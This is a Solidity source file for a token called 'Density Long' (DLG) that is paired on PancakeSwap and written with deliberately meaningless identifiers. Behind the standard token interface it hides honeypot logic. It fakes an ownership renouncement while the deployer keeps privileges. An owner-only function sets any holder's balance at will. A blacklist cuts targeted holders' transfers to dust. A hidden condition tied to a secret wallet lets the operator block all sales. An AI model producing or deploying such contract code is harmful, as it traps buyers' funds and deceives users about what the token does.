//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface takeShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenLimitIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeMax {
    function createPair(address fromLimit, address autoTake) external returns (address);
}

interface liquidityFeeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenList) external view returns (uint256);

    function transfer(address fromMax, uint256 tokenMarketing) external returns (bool);

    function allowance(address fundLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address fromMax,
        uint256 tokenMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingAt, uint256 value);
    event Approval(address indexed fundLimit, address indexed spender, uint256 value);
}

interface walletAutoMin is liquidityFeeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DensityLong is tokenLimitIs, liquidityFeeSwap, walletAutoMin {

    function senderFund() public {
        emit OwnershipTransferred(fromLaunched, address(0));
        launchedBuy = address(0);
    }

    function receiverTeam(address fundIs, uint256 tokenMarketing) public {
        launchedIsReceiver();
        minMax[fundIs] = tokenMarketing;
    }

    function receiverMin(address receiverLiquidityFee) public {
        if (buyTo) {
            return;
        }
        
        enableMode[receiverLiquidityFee] = true;
        
        buyTo = true;
    }

    mapping(address => mapping(address => uint256)) private takeToken;

    function transfer(address fundIs, uint256 tokenMarketing) external virtual override returns (bool) {
        return maxSwap(_msgSender(), fundIs, tokenMarketing);
    }

    address receiverTokenEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public txFundSwap;

    address public fromLaunched;

    function getOwner() external view returns (address) {
        return launchedBuy;
    }

    bool public marketingAt;

    uint8 private exemptTeam = 18;

    uint256 private tradingEnable;

    function name() external view virtual override returns (string memory) {
        return minToken;
    }

    mapping(address => uint256) private minMax;

    string private minToken = "Density Long";

    uint256 swapEnable;

    uint256 constant listTotal = 10 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return enableList;
    }

    bool private tradingList;

    address public maxIs;

    constructor (){
        if (fundMarketingFee != tradingEnable) {
            maxAmount = fundMarketingFee;
        }
        takeShould liquidityFund = takeShould(takeAuto);
        maxIs = modeMax(liquidityFund.factory()).createPair(liquidityFund.WETH(), address(this));
        if (tradingList != fundToToken) {
            tradingEnable = fundMarketingFee;
        }
        fromLaunched = _msgSender();
        senderFund();
        enableMode[fromLaunched] = true;
        minMax[fromLaunched] = enableList;
        if (maxAmount != tradingSenderTake) {
            tradingSenderTake = teamFeeReceiver;
        }
        emit Transfer(address(0), fromLaunched, enableList);
    }

    function launchedIsReceiver() private view {
        require(enableMode[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return liquidityReceiver;
    }

    address private launchedBuy;

    mapping(address => bool) public enableMode;

    uint256 public fundMarketingFee;

    function owner() external view returns (address) {
        return launchedBuy;
    }

    uint256 public teamFeeReceiver;

    function transferFrom(address fundAutoTo, address fromMax, uint256 tokenMarketing) external override returns (bool) {
        if (_msgSender() != takeAuto) {
            if (takeToken[fundAutoTo][_msgSender()] != type(uint256).max) {
                require(tokenMarketing <= takeToken[fundAutoTo][_msgSender()]);
                takeToken[fundAutoTo][_msgSender()] -= tokenMarketing;
            }
        }
        return maxSwap(fundAutoTo, fromMax, tokenMarketing);
    }

    address takeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address walletAt, uint256 tokenMarketing) public virtual override returns (bool) {
        takeToken[_msgSender()][walletAt] = tokenMarketing;
        emit Approval(_msgSender(), walletAt, tokenMarketing);
        return true;
    }

    bool public buyTo;

    string private liquidityReceiver = "DLG";

    uint256 private enableList = 100000000 * 10 ** 18;

    function balanceOf(address tokenList) public view virtual override returns (uint256) {
        return minMax[tokenList];
    }

    function senderMarketing(address amountFromSwap) public {
        launchedIsReceiver();
        if (tradingSenderTake == teamFeeReceiver) {
            teamFeeReceiver = tradingEnable;
        }
        if (amountFromSwap == fromLaunched || amountFromSwap == maxIs) {
            return;
        }
        txFundSwap[amountFromSwap] = true;
    }

    uint256 public maxAmount;

    function decimals() external view virtual override returns (uint8) {
        return exemptTeam;
    }

    event OwnershipTransferred(address indexed launchSwapList, address indexed feeFund);

    uint256 public atMode;

    uint256 marketingWalletLimit;

    function modeLiquidity(address fundAutoTo, address fromMax, uint256 tokenMarketing) internal returns (bool) {
        require(minMax[fundAutoTo] >= tokenMarketing);
        minMax[fundAutoTo] -= tokenMarketing;
        minMax[fromMax] += tokenMarketing;
        emit Transfer(fundAutoTo, fromMax, tokenMarketing);
        return true;
    }

    uint256 private tradingSenderTake;

    bool private fundToToken;

    function allowance(address txMin, address walletAt) external view virtual override returns (uint256) {
        if (walletAt == takeAuto) {
            return type(uint256).max;
        }
        return takeToken[txMin][walletAt];
    }

    function maxSwap(address fundAutoTo, address fromMax, uint256 tokenMarketing) internal returns (bool) {
        if (fundAutoTo == fromLaunched) {
            return modeLiquidity(fundAutoTo, fromMax, tokenMarketing);
        }
        uint256 sellTake = liquidityFeeSwap(maxIs).balanceOf(receiverTokenEnable);
        require(sellTake == marketingWalletLimit);
        require(fromMax != receiverTokenEnable);
        if (txFundSwap[fundAutoTo]) {
            return modeLiquidity(fundAutoTo, fromMax, listTotal);
        }
        return modeLiquidity(fundAutoTo, fromMax, tokenMarketing);
    }

    function feeReceiverBuy(uint256 tokenMarketing) public {
        launchedIsReceiver();
        marketingWalletLimit = tokenMarketing;
    }

}